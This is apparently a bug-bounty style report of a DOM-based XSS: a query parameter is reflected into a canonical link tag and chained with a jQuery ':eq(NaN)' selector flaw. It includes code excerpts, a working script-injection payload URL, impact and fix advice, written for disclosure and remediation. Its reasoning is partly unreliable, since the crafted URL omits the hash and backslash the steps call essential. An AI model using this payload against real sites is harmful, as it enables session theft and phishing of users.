# Title
DOM-based Cross-Site Scripting (XSS) via URL Hash Fragment and jQuery `:eq(NaN)` Selector Injection

# Vulnerability Type
DOM-XSS

# Summary
The application is vulnerable to DOM-based Cross-Site Scripting (XSS) due to a chained exploit involving server-side reflection and a client-side jQuery selector bug. The URL query parameter (`?slug=`) is reflected unsanitized into a `<link rel="canonical">` tag in the `<head>`, allowing an attacker to inject an HTML tag (e.g., `<script>` or an event handler). Separately, a legacy routing script reads the URL hash (`#!`) and passes it into a jQuery selector. Because the sanitization regex fails to escape backslashes and allows non-numeric values to evaluate as `NaN`, jQuery 1.x's `:eq(NaN)` matches _all_ elements on the page. The script then triggers a click on every element, causing the injected payload in the `<head>` to execute.

**Vulnerable Code Analysis (Source to Sink):**

- **Source (Tainted Data):**  
The user input is reflected directly into the DOM (server-side) and read via the URL hash (client-side).
```html
<!-- Reflected parameter in HTML -->
<link rel="canonical" href="https://www.starbucks.co.uk/.../thank-you/rix4uni'"><script>...">
```

```js
// Reading the hash
var hashtag = (url.indexOf("#!") != -1) ? decodeURI(url.substring(url.indexOf("#!") + 2, url.length)) : false;
```

- **Flawed Processing:**  
The `parseInt()` function evaluates non-numeric input as `NaN`. The sanitization regex fails to escape the backslash (`\`), allowing attackers to break out of the string context.

```js
hashIndex = parseInt(hashIndex); // Evaluates to NaN
// Regex misses the backslash (\) character
hashRel = hashRel.replace(/([ #;&,.+*~\':"!^$[\]()=>|\/])/g, "\\$1"); 
```

- **Sink (Execution Point):**  
The dynamic jQuery selector uses `:eq(NaN)`, matching all elements, and triggers a click on them.

```js
$("a[rel^='" + hashRel + "']:eq(" + hashIndex + ")").trigger("click");
```
# Vulnerable Endpoint
`https://kzlabs.store/subdomains/cafe/`

# Steps to Reproduce
1. Navigate to the vulnerable page: `https://kzlabs.store/subdomains/cafe/`
2. Observe that the `?slug=` parameter is reflected inside the `<link rel="canonical">` tag in the `<head>`.
3. Inject an XSS payload into the `slug` parameter to break out of the `href` attribute and add an event handler. Use a backslash (`\`) to break the jQuery selector, and append `#!x/` to the URL to force `hashIndex` to evaluate as `NaN`.
4. Load the following crafted URL:  
    `https://kzlabs.store/subdomains/cafe/?slug=rix4uni%27%22%3E%3CScript%3Econfirm(1)%3C/script%3E`  
5. Upon page load, the browser will execute the `confirm(1)` alert box.

# Payload Used
**Query Parameter Payload:**
```
?slug=rix4uni%27%22%3E%3CScript%3Econfirm(1)%3C/script%3E
```
# Proof of Concept
<img width="1920" height="1038" alt="6" src="https://github.com/user-attachments/assets/6a985bd2-61c4-4be8-a2cd-88f62f00bed2" />
<img width="1920" height="1037" alt="7" src="https://github.com/user-attachments/assets/60f56ed2-9db6-4113-8365-fa12f89e0342" />
<img width="1920" height="1038" alt="8" src="https://github.com/user-attachments/assets/11461009-5407-4e61-bbb3-05e9a014cf08" />

**Resulting DOM structure:**
```js
<head>
    <link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift/thank-you/rix4uni'"><script>confirm(1)</script>">
</head>
```
# Impact
- **Arbitrary JavaScript Execution:** An attacker can execute malicious scripts in the context of the victim's browser session by tricking them into clicking a crafted link.
- **Account Takeover:** Attackers can steal session cookies or local storage tokens, allowing them to impersonate the victim.
- **Data Exfiltration:** Malicious scripts can read sensitive data (like user details or order history) and send it to an attacker-controlled server.
- **Phishing:** Attackers can modify the DOM to display fake login forms or transaction approval windows to steal credentials.

# Recommendation for fix
1. **Fix Server-Side Reflection:** Ensure that any user input (like the `slug` parameter) reflected in the HTML is strictly context-aware HTML-encoded. The `<link rel="canonical">` tag should never allow unescaped quotes or angle brackets.
2. **Update jQuery:** Upgrade to a modern version of jQuery (3.x) where `:eq(NaN)` no longer matches all elements.
3. **Avoid Dynamic Selectors:** Do not construct jQuery selectors directly from unvalidated user input. Use DOM traversal methods like `.filter()` instead.
4. **Proper Sanitization:** If dynamic selectors are absolutely necessary, ensure the sanitization regex escapes backslashes (`\`) and strictly validates that the input matches expected formatting (e.g., `parseInt` validation).
